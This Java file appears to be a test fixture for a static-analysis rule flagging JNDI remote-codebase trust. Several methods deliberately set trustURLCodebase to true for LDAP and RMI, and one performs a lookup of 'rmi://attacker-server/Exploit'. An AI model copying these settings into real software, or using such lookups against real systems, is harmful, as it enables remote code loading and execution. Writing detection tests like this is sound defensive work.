package com.example.vulnerable.dangerousjndiremoteconfig;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.util.Properties;

public class JndiConfigExamples {
    // LDAP remote codebase enabled via Properties
    public void unsafeLdapConfig() {
        Properties props = new Properties();
        // ruleid: jndi-remote-codebase-config
        props.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        
        // Other JNDI configuration
        props.setProperty("java.naming.factory.initial", "com.sun.jndi.ldap.LdapCtxFactory");
        props.setProperty("java.naming.provider.url", "ldap://localhost:389");
        
        InitialContext ctx = new InitialContext(props);
    }

    // RMI remote codebase enabled via System.setProperty
    public void unsafeRmiConfig() {
        // ruleid: jndi-remote-codebase-config
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        
        // RMI lookup with dangerous configuration
        Context ctx = new InitialContext();
        Object obj = ctx.lookup("rmi://attacker-server/Exploit");
    }

    // both LDAP and RMI codebases enabled
    public void unsafeMultiConfig() {
        Properties props = new Properties();
        // ruleid: jndi-remote-codebase-config
        props.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        // ruleid: jndi-remote-codebase-config
        props.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
    }

    // remote codebase explicitly disabled
    public void safeLdapConfig() {
        Properties props = new Properties();
        // ok: jndi-remote-codebase-config
        props.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false");
        
        props.setProperty("java.naming.factory.initial", "com.sun.jndi.ldap.LdapCtxFactory");
        InitialContext ctx = new InitialContext(props);
    }

    // using local lookup only, no codebase trust
    public void safeLocalLookup() {
        Properties props = new Properties();
        props.setProperty("java.naming.factory.initial", "com.sun.jndi.ldap.LdapCtxFactory");
        props.setProperty("java.naming.provider.url", "ldap://localhost:389");
        // trustURLCodebase not set (default is false in modern JVMs)
        InitialContext ctx = new InitialContext(props);
    }

    // RMI codebase explicitly disabled
    public void safeRmiConfig() {
        // ok: jndi-remote-codebase-config
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "false");
        
        Context ctx = new InitialContext();
        Object obj = ctx.lookup("rmi://localhost:1099/ValidObject");
    }
}